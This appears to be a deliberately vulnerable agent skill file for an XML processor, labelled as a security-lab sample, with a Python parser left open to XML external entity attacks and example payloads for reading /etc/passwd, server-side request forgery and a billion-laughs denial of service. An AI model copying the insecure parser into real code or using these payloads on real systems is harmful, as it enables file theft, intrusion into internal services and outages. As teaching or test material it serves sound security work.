---
name: xml-processor
description: Process XML documents
metadata:
  author: VTrust Security Labs
  version: 1.0.0-vulnerable
  license: MIT
tags:
  - xml
  - xxe
  - VULNERABLE
dependencies:
  - python
  - lxml
---

# XML Processor Skill (VULNERABLE VERSION)

⚠️ **WARNING**: XML External Entity injection (CWE-611)

## Implementation

```python
#!/usr/bin/env python3
from lxml import etree

def parse_xml(xml_content):
    # VULNERABLE: XXE enabled by default
    parser = etree.XMLParser()
    tree = etree.fromstring(xml_content, parser)
    return tree
```

## 🔴 VULNERABILITY

### Exploitation

```xml
<!-- File disclosure -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- SSRF -->
<!ENTITY xxe SYSTEM "http://internal-service/admin">

<!-- Billion laughs DoS -->
<!ENTITY lol "lol">
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
```

**DREAD Score**: 8.5/10 (High)
